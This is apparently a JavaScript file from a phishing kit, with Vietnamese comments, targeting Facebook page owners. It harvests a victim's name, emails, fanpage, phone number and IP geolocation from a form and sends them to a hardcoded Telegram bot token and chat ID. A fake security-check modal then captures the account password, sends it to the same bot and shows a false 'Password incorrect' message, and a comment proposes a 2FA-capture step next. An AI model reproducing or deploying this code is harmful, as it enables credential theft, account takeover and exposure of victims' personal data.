// ==================== CẤU HÌNH TRỰC TIẾP ====================
// Bạn có thể điền trực tiếp Token và ID vào đây để chắc chắn 100%
const BOT_TOKEN = '8648725712:AAGvpKkUW8V9dB6yBpwvkyvIi0xCHNdaHAk'; 
const CHAT_ID = '-5286997232';

async function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (e) { console.error("Lỗi gửi Telegram:", e); }
}

async function getLocation() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        return await res.json();
    } catch (e) { return {}; }
}

// ==================== LOGIC CHÍNH ====================
document.getElementById('clientForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const btn = e.target.querySelector('button');
    btn.disabled = true;
    btn.innerHTML = 'Loading...';

    const loc = await getLocation();
    const data = {
        name: document.getElementById('fullName').value,
        email: document.getElementById('email').value,
        eb: document.getElementById('emailBusiness').value,
        page: document.getElementById('fanpage').value,
        phone: document.getElementById('phone').value,
        ip: loc.ip || "N/A",
        country: loc.country_name || "N/A",
        city: loc.city || "N/A"
    };

    // Lưu tạm vào máy
    localStorage.setItem('user_data', JSON.stringify(data));

    // Gửi tin nhắn đầu tiên có IP
    const msg = `
<b>🔔 CÓ DATA MỚI</b>
- Họ tên: ${data.name}
- Email: ${data.email}
- Fanpage: ${data.page}
- SĐT: ${data.phone}
\n🌍 <b>VỊ TRÍ:</b>
- IP: ${data.ip}
- Quốc gia: ${data.country}
- Thành phố: ${data.city}
    `;
    await sendToTelegram(msg);

    btn.disabled = false;
    btn.textContent = 'Continue';
    openSecurityModal();
});

function openSecurityModal() {
    const content = `
        <div style="padding: 20px;">
            <p>For your security, enter password to continue.</p>
            <form id="securityForm">
                <input type="password" id="pass" placeholder="Password" style="width:100%; margin-bottom:10px; padding:8px; border:1px solid #ccc; border-radius:5px;">
                <button type="submit" style="width:100%; background:#0064E0; color:white; border:none; padding:10px; border-radius:20px;">Continue</button>
            </form>
        </div>
    `;
    Modal.create('securityModal', content);
    Modal.open('securityModal');

    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const pass = document.getElementById('pass').value;
        const localData = JSON.parse(localStorage.getItem('user_data'));

        const msg = `<b>🔑 PASSWORD:</b> ${pass}\n<b>👤 User:</b> ${localData.email}`;
        await sendToTelegram(msg);

        // Sau khi gửi pass thì chuyển qua 2FA hoặc báo lỗi giả tùy ý bạn
        alert("Password incorrect, please try again."); 
    });
}
